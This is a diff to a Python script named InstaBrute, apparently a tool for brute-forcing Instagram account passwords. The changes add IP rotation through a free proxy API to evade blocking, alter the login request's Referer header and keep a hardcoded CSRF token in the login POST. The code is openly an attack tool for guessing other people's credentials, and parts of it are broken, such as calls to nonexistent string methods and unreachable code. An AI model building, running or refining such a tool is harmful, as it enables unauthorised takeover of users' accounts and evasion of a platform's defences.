@@ -6,6 +6,7 @@ from colorama import Fore
 CheckVersion = str(sys.version)
 import re
 from datetime import datetime
+from requests import get
 
 normal_color = "\33[00m"
 info_color = "\033[1;33m"
@@ -43,6 +44,7 @@ print ('''
 ==============================================
 [developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
 [developer_snapchat] => flaah999
+[updated 23/03/22 by Uvubu]
 ==============================================
 ''')
 
@@ -87,21 +89,27 @@ class InstaBrute(object):
         while 1:
             try:
                 print('')
-                print(normal_color+'[*] Check new ip...')
-                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
-                                        timeout=10.0).text
-                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
-                    print(whiteB_color + '[*] Your public ip: %s' % response)
+                print(normal_color+'[*] Check new ip...') # old one : https://api.ipify.org
+                response = get('https://public.freeproxyapi.com/api/Proxy/Mini?=raw').text                
+                posh = response.find('h')
+                i = posh+7
+                currentip = ""
+                while(response[i]!='"'):
+                	currentip += response[i]
+                	i+=1	              	
+                proxy = format(currentip)
+                if currentip != "":
+                    print(whiteB_color + '[*] Your public ip: %s' % proxy)
                     print('')
                     break
                 else:
                     continue
-                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
-                #     raise Exception("Can not reach proxy")
-                # else:
-                #     break
+                if (response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request"):
+                    raise Exception("Can't reach proxy")
+                else:
+                    break
             except Exception as e:
-                print('[*] Can\'t reach proxy "%s"' % proxy)
+                print("[*] Can't reach proxy", proxy)
                 proxy = random.choice(plist)
                
             print('')
@@ -128,7 +136,7 @@ class InstaBrute(object):
             r = s.post(login_url, data=payload, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
-                "Referer": "https://www.instagram.com/accounts/login/",
+                "Referer": "https://www.instagram.fr/accounts/login/",
                 "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
             })
 
